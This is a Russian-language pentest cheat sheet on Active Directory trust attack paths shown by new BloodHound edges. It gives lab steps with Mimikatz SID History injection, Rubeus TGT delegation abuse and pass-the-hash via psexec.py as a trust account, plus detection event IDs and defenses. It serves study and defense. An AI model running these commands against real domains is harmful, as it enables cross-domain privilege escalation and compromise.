# AD Trusts Attack Paths (via BloodHound)

**Источник:** SpecterOps, June 2025  
**Новизна в 2025:** Новые attack edges в BloodHound: **Spoof SID History**, **AbuseTGTDelegation**, **Trust Account Attack**.  
Эти техники позволяют находить и использовать пути междоменного компромисса в сложных AD-инфраструктурах.

---

## 🎯 Цель атаки
Использовать trust-отношения между доменами для перехода от одного домена (или леса) к другому и захвата привилегий в целевой среде.

## 📋 Описание
Trusts в Active Directory — это доверительные отношения между доменами/лесами.  
BloodHound в 2025 получил поддержку новых рёбер графа, отражающих:
- **Spoof SID History** — подмена SID History для получения доступа к ресурсам другого домена.
- **AbuseTGTDelegation** — злоупотребление TGT Delegation для выдачи тикетов на сервисы в другом домене.
- **Trust Account Attack** — эксплуатация учётных записей trust-объектов (например, `$`-аккаунтов доменов).

## ⚠ Условия эксплуатации
- Доступ к хотя бы одному домену с правами, позволяющими управлять trust-объектами или связанными учетками.
- Возможность выполнения Kerberos-запросов между доменами.
- Отсутствие строгих фильтров SID History и делегации.

## 🔹 Пошагово в лаборатории
> ⚠ Только в тестовой среде!

1. Сбор данных BloodHound SharpHound:
```powershell
SharpHound.exe -c All --zipfilename trust_edges.zip
```
2. Анализ новых рёбер в BloodHound:
   - Spoof SID History
   - AbuseTGTDelegation
   - Trust Account Attack
3. Выполнение атаки **Spoof SID History** (пример с Mimikatz):
```powershell
mimikatz "sid::patch" "sid::add /sid:S-1-5-21-<TARGET-SID>" "exit"
```
4. **Abuse TGT Delegation**:
```powershell
Rubeus.exe tgtdeleg /target:target.domain.local
```
5. **Trust Account Attack** — аутентификация от имени trust-аккаунта:
```bash
psexec.py child.domain/TrustAccount$@dc.target.domain.local -hashes :<NTLM_HASH>
```

## 📊 Признаки в логах и мониторинг
- Event ID **4769** и **4624** с междоменными обращениями.
- Изменения атрибута `SIDHistory` (Event ID 4765/4766).
- Kerberos делегация к сервисам вне текущего домена.
- Логины trust-аккаунтов с нетипичных IP.

## 🛡 Меры защиты
- Ограничить SID History и делегацию.
- Разделить администрирование между доменами.
- Мониторить события 4765, 4766, 4769, 4624.
- Регулярно пересматривать trust-отношения.

## 🔗 Источники
- SpecterOps, June 2025 — AD Trusts New Attack Paths

---

## 🔍 Разбор команд

### 1. Сбор данных SharpHound
```powershell
SharpHound.exe -c All --zipfilename trust_edges.zip
```
- **`-c All`** — полный сбор данных (включая trust-отношения).
- **`--zipfilename`** — имя архива с результатами.

### 2. Spoof SID History через Mimikatz
```powershell
mimikatz "sid::patch" "sid::add /sid:S-1-5-21-<TARGET-SID>" "exit"
```
- **`sid::patch`** — активирует патч для работы с SID.
- **`sid::add`** — добавляет SID другой учётки в SIDHistory.

### 3. Abuse TGT Delegation с Rubeus
```powershell
Rubeus.exe tgtdeleg /target:target.domain.local
```
- Получает TGT с делегацией для целевого сервиса/домена.

### 4. Trust Account Attack
```bash
psexec.py child.domain/TrustAccount$@dc.target.domain.local -hashes :<NTLM_HASH>
```
- Аутентификация от имени trust-аккаунта для выполнения команд.
